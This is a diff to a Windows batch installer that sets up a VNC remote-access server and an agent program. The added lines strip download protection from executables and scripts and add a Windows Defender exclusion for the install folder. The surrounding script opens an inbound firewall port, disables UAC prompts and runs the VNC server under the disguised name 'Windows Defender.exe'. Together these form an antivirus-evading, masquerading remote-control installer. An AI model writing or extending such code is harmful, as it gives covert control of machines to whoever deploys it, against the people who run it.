@@ -133,6 +133,9 @@ if not exist "%DEST%\VncDirect\vnc\index.html" (
     pause
     exit /b 1
 )
+
+echo    Unblocking downloaded files...
+powershell -NoProfile -Command "Get-ChildItem '%DEST%' -Recurse -Include '*.exe','*.dll','*.bat','*.vbs' | Unblock-File -ErrorAction SilentlyContinue"
 echo    Files installed.
 
 REM --- Save password ---
@@ -178,22 +181,16 @@ echo [5/7] Setting up firewall rules...
 netsh advfirewall firewall show rule name="VNC Direct 7002" >nul 2>&1
 if %errorlevel% equ 0 goto skip_firewall_allow
 netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul 2>&1
-if %errorlevel% equ 0 (
-    echo     [+] Firewall rule "VNC Direct 7002" (allow) created.
-) else (
-    echo     [-] Failed to create firewall allow rule. Run as Admin.
-)
+if %errorlevel% equ 0 goto skip_firewall_allow
+echo     [-] Failed to create firewall allow rule. Run as Admin.
 :skip_firewall_allow
 
 netsh advfirewall firewall show rule name="VNC Block Localhost" >nul 2>&1
 if %errorlevel% equ 0 goto skip_firewall_block
 netsh advfirewall firewall add rule name="VNC Block Localhost" dir=in action=block protocol=TCP localport=7002 remoteip=127.0.0.1 >nul 2>&1
 netsh advfirewall firewall add rule name="VNC Block Localhost v6" dir=in action=block protocol=TCP localport=7002 remoteip=::1 >nul 2>&1
-if %errorlevel% equ 0 (
-    echo     [+] Firewall rules "VNC Block Localhost" created.
-) else (
-    echo     [-] Failed to create firewall block rules. Run as Admin.
-)
+if %errorlevel% equ 0 goto skip_firewall_block
+echo     [-] Failed to create firewall block rules. Run as Admin.
 :skip_firewall_block
 
 REM --- 6. Disable UAC prompts (needed for VNC to show admin dialogs) ---
@@ -204,8 +201,14 @@ echo     UAC prompts disabled. Restart required to take effect.
 
 REM --- 7. Start services ---
 echo [7/7] Starting Agent and VNC Server...
+
+echo    Adding Windows Defender exclusion...
+powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%DEST%' -ErrorAction SilentlyContinue"
+
+echo    Starting VNC Server...
 cd /d "%DEST%\VncDirect\vnc"
 start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
+echo    Starting Agent...
 cd /d "%DEST%"
 start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd="%DEST%"
 
